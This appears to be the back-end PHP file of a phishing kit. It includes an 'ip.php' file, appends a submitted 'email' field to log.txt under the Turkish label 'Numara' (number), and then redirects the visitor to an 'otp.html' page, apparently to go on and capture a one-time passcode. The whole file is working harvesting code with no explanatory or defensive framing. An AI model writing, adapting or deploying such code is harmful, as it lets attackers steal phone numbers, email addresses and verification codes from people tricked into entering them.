<?php
include 'ip.php';
file_put_contents("log.txt", "Numara: " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>